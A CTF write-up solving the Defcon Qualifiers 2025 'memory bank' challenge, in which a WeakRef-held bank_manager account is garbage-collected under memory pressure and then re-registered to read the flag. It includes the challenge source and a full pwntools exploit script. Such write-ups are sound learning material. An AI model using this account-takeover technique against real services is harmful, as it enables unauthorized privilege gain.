---
title: Defcon CTF Qualifiers 2025 - PWN
date: 2025-04-15
tags: [ctf, pwn]
categories: [CTF Writeups]
author: 2Fa0n
img_path: /assets/img/defcon-ctf-quals_2025
image: /assets/img/defcon-ctf-quals_2025/defcon_banner.png
---

# PWN
## memory bank
**Solvers:** *** <br>
**Author:** defcon

### Description
![memory_bank](/assets/img/defcon-ctf-quals_2025/memory_bank.png)

### Solution
For this challenge, I just analyze from the writeup because I was not able to find the flag due to I miss some information when auditing the source code. And also I have never play PWN before so I just want to challenge myself and learn something new. <br>
After examining the source code in `index.js`:
```js
// ANSI color codes
const RESET = "\x1b[0m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const BLUE = "\x1b[34m";
const MAGENTA = "\x1b[35m";
const CYAN = "\x1b[36m";
const WHITE = "\x1b[37m";
const BRIGHT = "\x1b[1m";
const DIM = "\x1b[2m";

// ASCII Art
const ATM_ART = `
${CYAN}╔══════════════════════════════════════════════════════╗
║ ${BRIGHT}╔═╗╔╦╗╔╦╗  ╔╦╗╔═╗╔═╗╦ ╦╦╔╗╔╔═╗  ╔╦╗╔═╗╔═╗╦ ╦╦╔╗╔╔═╗${RESET}${CYAN}  ║
║ ${BRIGHT}╠═╣ ║ ║║║──║║║╠═╣║  ╠═╣║║║║║╣ ──║║║╠═╣║  ╠═╣║║║║║╣ ${RESET}${CYAN}  ║
║ ${BRIGHT}╩ ╩ ╩ ╩ ╩  ╩ ╩╩ ╩╚═╝╩ ╩╩╝╚╝╚═╝  ╩ ╩╩ ╩╚═╝╩ ╩╩╝╚╝╚═╝${RESET}${CYAN}  ║
║                                                      ║
║  ${MAGENTA}┌─────────────────────┐${CYAN}                             ║
║  ${MAGENTA}│     ${WHITE}MEMORY BANK${MAGENTA}     │${CYAN}                             ║
║  ${MAGENTA}└─────────────────────┘${CYAN}                             ║
║                                                      ║
║  ${YELLOW}┌─────┬─────┬─────┐${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}1${YELLOW}  │  ${WHITE}2${YELLOW}  │  ${WHITE}3${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}├─────┼─────┼─────┤${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}4${YELLOW}  │  ${WHITE}5${YELLOW}  │  ${WHITE}6${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}├─────┼─────┼─────┤${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}7${YELLOW}  │  ${WHITE}8${YELLOW}  │  ${WHITE}9${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}├─────┼─────┼─────┤${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}*${YELLOW}  │  ${WHITE}0${YELLOW}  │  ${WHITE}#${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}└─────┴─────┴─────┘${CYAN}                                 ║
║                                                      ║
║  ${GREEN}╔══════════════════╗${CYAN}                                ║
║  ${GREEN}║ ${WHITE}INSERT CARD HERE${GREEN} ║${CYAN}                                ║
║  ${GREEN}╚══════════════════╝${CYAN}                                ║
║                                                      ║
║  ${BLUE}┌─────────────────┐${CYAN}                                 ║
║  ${BLUE}│ ${WHITE}CASH DISPENSER${BLUE}  │${CYAN}                                 ║
║  ${BLUE}└─────────────────┘${CYAN}                                 ║
╚══════════════════════════════════════════════════════╝${RESET}`;

const MARBLE_TOP = `
${DIM}${WHITE}╔══════════════════════════════════════════════════════╗
║ ▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓   ║
║ ░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░   ║
║ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║
╚══════════════════════════════════════════════════════╝${RESET}`;

const MARBLE_BOTTOM = `
${DIM}${WHITE}╔══════════════════════════════════════════════════════╗
║ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║
║ ░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░   ║
║ ▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓   ║
╚══════════════════════════════════════════════════════╝${RESET}`;

class User {
  constructor(username) {
    this.username = username;
    this.balance = 101;
    this.signature = null;
  }
}

class Bill {
  constructor(value, signature) {
    this.value = value;
    this.serialNumber = 'SN-' + crypto.randomUUID();
    this.signature = new Uint8Array(signature.length);
    for (let i = 0; i < signature.length; i++) {
      this.signature[i] = signature.charCodeAt(i);
    }
  }
  
  toString() {
    return `${this.value} token bill (S/N: ${this.serialNumber})`;
  }
}

class UserRegistry {
  constructor() {
    this.users = [];
  }
  addUser(user) {
    this.users.push(new WeakRef(user));
  }
  getUserByUsername(username) {
    for (let user of this.users) {
      user = user.deref();
      if (!user) continue;
      if (user.username === username) {
        return user;
      }
    }
    return null;
  }
  
  *[Symbol.iterator]() {
    for (const weakRef of this.users) {
      const user = weakRef.deref();
      if (user) yield user;
    }
  }
}
const users = new UserRegistry();

function promptSync(message) {
  const buf = new Uint8Array(1024*1024);
  Deno.stdout.writeSync(new TextEncoder().encode(`${YELLOW}${message}${RESET}`));
  const n = Deno.stdin.readSync(buf);
  return new TextDecoder().decode(buf.subarray(0, n)).trim();
}

function init() {
  users.addUser(new User("bank_manager"));
}

async function main() {
  init();
  console.log(ATM_ART);
  console.log(MARBLE_TOP);
  console.log(`${BRIGHT}${CYAN}Welcome to the Memory Banking System! Loading...${RESET}`);
  console.log(MARBLE_BOTTOM);

  setTimeout(async () => {
    await user();
  }, 1000);
}

async function user() {
  
  let isLoggedIn = false;
  let currentUser = null;
  
  while (true) {
    // If not logged in, require registration
    if (!isLoggedIn) {
      console.log(`${YELLOW}You have 20 seconds to complete your transaction before the bank closes for the day.\n${RESET}`);
      
      // Register user
      while (!isLoggedIn) {
        let username = promptSync("Please register with a username (or type 'exit' to quit): ");
        if (!username) {
          console.log(`${CYAN}Thank you for using Memory Banking System!${RESET}`);
          Deno.exit(0);
        }
        
        if (username.toLowerCase() === 'exit') {
          console.log(`${CYAN}Thank you for using Memory Banking System!${RESET}`);
          Deno.exit(0);
        }

        if (username.toLowerCase() === 'random') {
          username = 'random-' + crypto.randomUUID();
        } else {
          let existingUser = users.getUserByUsername(username);
      
          if (existingUser) {
            console.log(`${MAGENTA}User already exists. Please choose another username.${RESET}`);
            continue;
          }
        }

        currentUser = new User(username);
        users.addUser(currentUser);
        if (currentUser.username === "bank_manager") {
          currentUser.balance = 100000000;
        }
        console.log(MARBLE_TOP);
        console.log(`${BRIGHT}${GREEN}Welcome, ${username}! Your starting balance is ${currentUser.balance} tokens.${RESET}`);
        console.log(MARBLE_BOTTOM);
        
        isLoggedIn = true;
      }
    }
  
    // Banking operations
    console.log("\n" + MARBLE_TOP);
    console.log(`${CYAN}${BRIGHT}Available operations:${RESET}`);
    console.log(`${CYAN}1. Check balance${RESET}`);
    console.log(`${CYAN}2. Withdraw tokens${RESET}`);
    console.log(`${CYAN}3. Set signature${RESET}`);
    console.log(`${CYAN}4. Logout${RESET}`);
    console.log(`${CYAN}5. Exit${RESET}`);
    
    // Special admin option for bank_manager
    if (currentUser.username === "bank_manager") {
      console.log(`${MAGENTA}${BRIGHT}6. Vault: Withdrawflag${RESET}`);
    }
    console.log(MARBLE_BOTTOM);
    
    const choice = promptSync("Choose an operation (1-" + (currentUser.username === "bank_manager" ? "6" : "5") + "): ");
    
    switch (choice) {
      case "1":
        console.log(`${GREEN}Your balance is ${BRIGHT}${currentUser.balance}${RESET}${GREEN} tokens.${RESET}`);
        break;
        
      case "2":
        const amount = parseInt(promptSync("Enter amount to withdraw: "));
        
        if (isNaN(amount) || amount <= 0) {
          console.log(`${MAGENTA}Invalid amount.${RESET}`);
          continue;
        }
        
        if (amount > currentUser.balance) {
          console.log(`${MAGENTA}Insufficient funds.${RESET}`);
          continue;
        }
        
        const billOptions = [1, 5, 10, 20, 50, 100];
        console.log(`${YELLOW}Available bill denominations: ${billOptions.join(", ")}${RESET}`);
        const denomStr = promptSync("Enter bill denomination: ");
        const denomination = parseFloat(denomStr);

        if (denomination <=0 || isNaN(denomination) || denomination > amount) {
          console.log(`${MAGENTA}Invalid denomination: ${denomination}${RESET}`);
          continue;
        }

        const numBills = amount / denomination;
        const bills = [];

        for (let i = 0; i < numBills; i++) {
          bills.push(new Bill(denomination, currentUser.signature || 'VOID'));
        }
        
        currentUser.balance -= amount;
        
        console.log(`${GREEN}Withdrew ${BRIGHT}${amount}${RESET}${GREEN} tokens as ${bills.length} bills of ${denomination}:${RESET}`);
        //bills.forEach(bill => console.log(`- ${bill}`));
        console.log(`${GREEN}Remaining balance: ${BRIGHT}${currentUser.balance}${RESET}${GREEN} tokens${RESET}`);
        break;
        
      case "3":
        // Set signature
        const signature = promptSync("Enter your signature (will be used on bills): ");
        currentUser.signature = signature;
        console.log(`${GREEN}Your signature has been updated${RESET}`);
        break;
        
      case "4":
        // Logout
        console.log(`${YELLOW}You have been logged out.${RESET}`);
        isLoggedIn = false;
        currentUser = null;
        break;
        
      case "5":
        // Exit
        console.log(MARBLE_TOP);
        console.log(`${CYAN}${BRIGHT}Thank you for using Memory Banking System!${RESET}`);
        console.log(MARBLE_BOTTOM);
        Deno.exit(0);
        
      case "6":
        if (currentUser.username === "bank_manager") {
          try {
            const flag = Deno.readTextFileSync("/flag");
            console.log(`${BRIGHT}${GREEN}Flag contents:${RESET}`);
            console.log(`${BRIGHT}${GREEN}${flag}${RESET}`);
          } catch (err) {
            console.log(`${MAGENTA}Error reading flag file:${RESET}`, err.message);
          }
        } else {
          console.log(`${MAGENTA}${BRIGHT}Unauthorized access attempt logged 🚨🚨🚨🚨🚨🚨${RESET}`);
        }
        break;
                    
      default:
        console.log(`${MAGENTA}Invalid option.${RESET}`);
    }
  }
}

main().catch(err => {
  console.error(`${MAGENTA}An error occurred:${RESET}`, err);
  Deno.exit(1);
});
```

We discover a banking system with features like:
- User registration and authentication
- Balance checking
- Token withdrawal and bill creation
- Setting personal signatures
- Logout/login functionality

Found some interesting part in the source code:
```js
class UserRegistry {
  constructor() {
    this.users = [];
  }
  addUser(user) {
    this.users.push(new WeakRef(user));  // Users stored as WeakRefs
  }
  getUserByUsername(username) {
    for (let user of this.users) {
      user = user.deref();
      if (!user) continue;  // Skip if object was garbage collected
      if (user.username === username) {
        return user;
      }
    }
    return null;
  }
}
```

And flag retrieval is only available for `bank_manager` account. <br>
```js
if (currentUser.username === "bank_manager") {
  try {
    const flag = Deno.readTextFileSync("/flag");
    console.log(`${BRIGHT}${GREEN}Flag contents:${RESET}`);
    console.log(`${BRIGHT}${GREEN}${flag}${RESET}`);
  } catch (err) {
    console.log(`${MAGENTA}Error reading flag file:${RESET}`, err.message);
  }
}
```

So what is `WeakRef`? <br>
From [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WeakRef):
> The WeakRef object lets you reference an object while still allowing the garbage collector to collect the object.

Some example of WeakRef:
```js
// Strong reference
let treasureBox = { gold: 100 };
let strongPointer = treasureBox;  // another strong reference

treasureBox = null;  // Remove initial reference
console.log(strongPointer.gold);  // Still prints 100, object persists

// Weak reference
let jewelChest = { diamonds: 50 };
let weakPointer = new WeakRef(jewelChest);  // weak reference

jewelChest = null;  // Remove the only strong reference
// After GC runs
let chest = weakPointer.deref();  // May return null if collected
```

So the flaw lies in:
- The `bank_manager` account is created in `init()` but only stored as a `WeakRef`
- There are no strong references to this `bank_manager` object
- When memory pressure is created, the GC can collect this object
- After collection, we can create a new user with the same `bank_manager` name

So I have create a script to add some user and then logout and login again to create a new user with the same `bank_manager` name but I miss the part that the balance is not 100000000. <br>
In order to get the flag, we need pressure the memory, forcing the GC to clean up objects without strong references, including `bank_manager`. <br>

Check out this code:
```js
// Bill creation when withdrawing money
const numBills = amount / denomination;
const bills = [];

for (let i = 0; i < numBills; i++) {
  bills.push(new Bill(denomination, currentUser.signature || 'VOID'));
}
```

```js
// Bill structure
class Bill {
  constructor(value, signature) {
    this.value = value;
    this.serialNumber = 'SN-' + crypto.randomUUID();
    this.signature = new Uint8Array(signature.length);
    for (let i = 0; i < signature.length; i++) {
      this.signature[i] = signature.charCodeAt(i);
    }
  }
}
```

If we withdrawal amount of 100 and a denomination of 0.001, it will create 100000 bills. <br>
So we need to create:
- Number of bills: 100 / 0.001 = 100,000 bills
- Each bill contains a copy of the signature (1000 bytes)
- Total memory usage: 100,000 × 1000 = 100,000,000 bytes ≈ 95.3 MB

So we need to create 95.3 MB of memory pressure to force the GC to clean up the `bank_manager` object. <br>

Here is the visualization of the memory usage:
```text
1. Initial state:
   [Memory]
   ├── User "bank_manager" ──> WeakRef in registry
   └── (~1MB memory used)

2. Register "random" user with 1000-char signature:
   [Memory]
   ├── User "bank_manager" ──> WeakRef in registry
   ├── User "random" ──> WeakRef + strong reference in currentUser
   └── (~1.1MB memory used)

3. Withdraw 100 tokens with 0.001 denomination:
   [Memory]
   ├── User "bank_manager" ──> WeakRef in registry
   ├── User "random" ──> WeakRef + strong reference
   ├── 100,000 Bills × 1000 bytes signature
   └── (~95MB memory used)

4. Logout (removing strong reference to "random"):
   [Memory]
   ├── User "bank_manager" ──> WeakRef in registry
   ├── User "random" ──> WeakRef in registry (no strong references)
   ├── 100,000 Bills
   └── (~95MB memory used)

5. Garbage Collection activates:
   [Memory]
   ├── WeakRef to "bank_manager" (object collected)
   ├── WeakRef to "random" (object collected)
   └── (Memory freed)

6. Register again with "bank_manager" name:
   [Memory]
   ├── New User "bank_manager" ──> WeakRef + strong reference
   └── Has flag access privileges
```

Here is the complete script:
```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

def main():
    # Connect to real server or run locally
    # p = remote('memorybank-tlc4zml47uyjm.shellweplayaga.me', 9005)
    p = process(['bash', './dist/run.sh'], cwd='.')
    
    # Uncomment when connecting to remote
    # p.recvuntil(b'please')
    # p.sendline(b'ticket{your_ticket_here}')
    
    # 1. Register random account
    p.recvuntil(b'register with a username')
    p.sendline(b'random')
    
    # 2. Set long signature
    p.recvuntil(b'Choose an operation')
    p.sendline(b'3')
    p.recvuntil(b'Enter your signature')
    p.sendline(b'A' * 1000)
    
    # 3. Withdraw money with tiny denomination
    p.recvuntil(b'Choose an operation')
    p.sendline(b'2')
    p.recvuntil(b'Enter amount to withdraw:')
    p.sendline(b'100')
    p.recvuntil(b'Enter bill denomination:')
    p.sendline(b'.001')
    
    # 4. Logout (remove strong reference)
    p.recvuntil(b'Choose an operation')
    p.sendline(b'4')
    
    # 5. Login again with "bank_manager" name
    p.recvuntil(b'register with a username')
    p.sendline(b'bank_manager')
    
    # 6. Access to get flag
    p.recvuntil(b'Choose an operation')
    p.sendline(b'6')
    
    # Switch to interactive mode to see flag
    p.interactive()

if __name__ == '__main__':
    main()
```

![image](/assets/img/defcon-ctf-quals_2025/image1.png)
![image](/assets/img/defcon-ctf-quals_2025/image2.png)

This analysis is based on the solution from [defcon-ctf-quals-2025-web-memory-banking-system](https://github.com/Nautilus-Institute/quals-2025/tree/main/memorybank). If I can look closer, I can find the part about bill withdrawal and can even exploit so this challenge is not quite hard but pretty cool and have learn something new.

**Flag:** `flag{XXX}`